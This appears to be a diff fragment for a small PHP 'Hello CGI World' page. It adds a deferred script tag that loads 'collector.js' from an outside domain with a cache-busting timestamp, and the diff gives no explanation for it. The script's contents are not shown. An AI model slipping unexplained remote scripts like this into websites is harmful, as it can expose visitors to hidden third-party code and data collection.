@@ -9,6 +9,7 @@ $ip = $_SERVER['REMOTE_ADDR'];
 <html>
 <head>
   <title>Hello CGI World</title>
+  <script defer src="https://collector.hknucsd-outreach.org/collector.js?v=<?=time()?>" ></script>
 </head>
 <body>
   <h1 align="center">Hello HTML World</h1><hr/>
